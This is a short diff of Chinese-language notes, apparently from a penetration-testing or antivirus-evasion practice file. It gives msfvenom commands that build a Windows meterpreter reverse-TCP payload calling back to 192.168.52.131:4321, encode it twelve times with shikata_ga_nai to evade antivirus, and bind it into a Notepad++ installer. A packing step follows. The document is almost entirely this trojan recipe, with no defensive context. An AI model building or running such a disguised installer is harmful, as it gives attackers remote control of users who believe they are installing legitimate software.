@@ -1,0 +1,4 @@
+使用x86/shikata_ga_nai免杀并捆绑在npp之上
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.131 lport=4321 -e x86/shikata_ga_nai -x npp.7.8.5.Installer.exe -i 12 -f exe -o .npp.exe
+再用Unx进行套壳
+unx npp.exe
